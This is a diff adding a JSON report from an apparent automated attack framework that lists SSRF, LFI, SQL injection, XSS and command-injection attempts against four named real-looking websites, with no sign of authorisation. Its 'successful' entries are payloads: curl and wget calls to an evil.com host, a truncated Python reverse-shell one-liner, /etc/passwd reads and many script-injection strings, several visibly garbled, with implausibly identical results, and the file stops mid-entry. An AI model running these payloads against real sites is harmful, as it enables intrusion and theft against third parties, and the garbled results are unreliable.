@@ -1,0 +1,2992 @@
+{
+  "report_title": "多向量攻击测试报告",
+  "report_time": "2025-10-28 13:03:40",
+  "framework_version": "MultiVectorAttackFramework v1.0",
+  "targets_tested": 4,
+  "attack_vectors_tested": 6,
+  "total_payloads_generated": 375,
+  "successful_attacks": 3,
+  "attack_results": [
+    {
+      "target": "https://peacoop.or.th",
+      "vector_type": "ssrf",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0
+    },
+    {
+      "target": "https://mula-x.com",
+      "vector_type": "ssrf",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0
+    },
+    {
+      "target": "https://mula-x.com",
+      "vector_type": "file_upload",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0
+    },
+    {
+      "target": "https://peacoop.or.th",
+      "vector_type": "file_upload",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0
+    },
+    {
+      "target": "https://peacoop.or.th",
+      "vector_type": "xss",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0.0
+    },
+    {
+      "target": "https://mula-x.com",
+      "vector_type": "lfi",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0.0
+    },
+    {
+      "target": "https://www.hanshin.com.tw",
+      "vector_type": "file_upload",
+      "timestamp": "2025-10-28 13:00:37",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0
+    },
+    {
+      "target": "https://mula-x.com",
+      "vector_type": "xss",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0.0
+    },
+    {
+      "target": "https://www.hanshin.com.tw",
+      "vector_type": "ssrf",
+      "timestamp": "2025-10-28 13:01:05",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0
+    },
+    {
+      "target": "https://mula-x.com",
+      "vector_type": "rce",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [
+        {
+          "parameter": "cmd",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "cmd",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "exec",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "command",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "run",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "id",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "search",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "file",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "& curl http://ev\u0000il.com/$(whoami)",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "; id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "; netstat -an\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "; whoami\u0000",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "&\thostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "& ho aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "%3B%20python%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csock...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "; lststat -an",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": ";\twhoami",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "%2526%2520hostname",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "`WgeT HTtp://EVil.COM/sHelL.php`",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "$/**(uname/**/-a)**/",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "%2524%2528uname%2520-a%2529",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "|\tps\taux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "| ps aux",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "| ID",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "%60cat%20/etc/passwd%60",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "%7C%20id",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "& curl http://evort socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connec...",
+          "indicator": "root",
+          "response_length": 1387
+        },
+        {
+          "parameter": "action",
+          "payload": "; ls aux",
+          "indicator": "root",
+          "response_length": 1387
+        }
+      ],
+      "failed_attempts": 0,
+      "success_rate": 100.0
+    },
+    {
+      "target": "https://peacoop.or.th",
+      "vector_type": "lfi",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0.0
+    },
+    {
+      "target": "https://mula-x.com",
+      "vector_type": "sql_injection",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0.0
+    },
+    {
+      "target": "https://ngoenmun.com",
+      "vector_type": "file_upload",
+      "timestamp": "2025-10-28 13:01:46",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0
+    },
+    {
+      "target": "https://www.hanshin.com.tw",
+      "vector_type": "rce",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0.0
+    },
+    {
+      "target": "https://ngoenmun.com",
+      "vector_type": "ssrf",
+      "timestamp": "2025-10-28 13:01:59",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0
+    },
+    {
+      "target": "https://www.hanshin.com.tw",
+      "vector_type": "lfi",
+      "timestamp": "2025-10-28 13:00:37",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0.0
+    },
+    {
+      "target": "https://www.hanshin.com.tw",
+      "vector_type": "sql_injection",
+      "timestamp": "2025-10-28 12:59:28",
+      "successful_payloads": [],
+      "failed_attempts": 0,
+      "success_rate": 0.0
+    },
+    {
+      "target": "https://www.hanshin.com.tw",
+      "vector_type": "xss",
+      "timestamp": "2025-10-28 13:00:30",
+      "successful_payloads": [
+        {
+          "parameter": "q",
+          "payload": "<script>alert(cus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<iframe src=javascnfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "&lt;input autofocus onfocus=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<select onfocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<input autofocus orror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<img src=x onerr onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<svg onload==alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<body onload=ocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<script>alert(nerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "&lt;body onload=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<keygen onfocus=alert%28'XSS'%29 autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<video><source onror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<input/**/autofocus/**/onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<svg onloadalert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<img src=x onerrnerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "&lt;video&gt;&lt;source onerror=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "%3Ctextarea%20onfocus%3Dalert%28%27XSS%27%29%20autofocus%3E",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<select/**/onfocus=alert('XSS')/**/autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "<script>alealert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "q",
+          "payload": "javascript%3Aalert%28%27XSS%27%29",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<script>alert(cus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<iframe src=javascnfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "&lt;input autofocus onfocus=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<select onfocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<input autofocus orror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<img src=x onerr onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<svg onload==alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<body onload=ocus=alert('XSS') autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<script>alert(nerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "&lt;body onload=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<keygen onfocus=alert%28'XSS'%29 autofocus>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<video><source onror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<input/**/autofocus/**/onfocus=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<svg onloadalert('XSS')",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "<img src=x onerrnerror=alert('XSS')>",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
+          "payload": "&lt;video&gt;&lt;source onerror=alert('XSS')&gt;",
+          "indicator": "javascript:",
+          "response_length": 78021
+        },
+        {
+          "parameter": "search",
